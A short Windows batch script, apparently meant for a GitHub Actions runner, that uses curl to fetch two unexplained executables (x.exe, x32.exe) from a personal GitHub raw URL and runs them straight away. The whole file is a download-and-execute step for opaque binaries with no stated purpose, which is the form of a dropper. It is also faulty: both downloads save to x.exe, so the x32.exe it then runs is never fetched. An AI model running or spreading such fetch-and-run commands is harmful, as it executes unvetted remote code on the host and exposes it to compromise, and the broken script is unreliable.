@echo off
REM Download x.exe using curl
curl -L -o "C:\Users\runneradmin\Desktop\x.exe" "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.exe"
curl -L -o "C:\Users\runneradmin\Desktop\x.exe" "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x32.exe"


REM Execute x.exe
"C:\Users\runneradmin\Desktop\x.exe"
"C:\Users\runneradmin\Desktop\x32.exe"

REM Pause to view output
pause
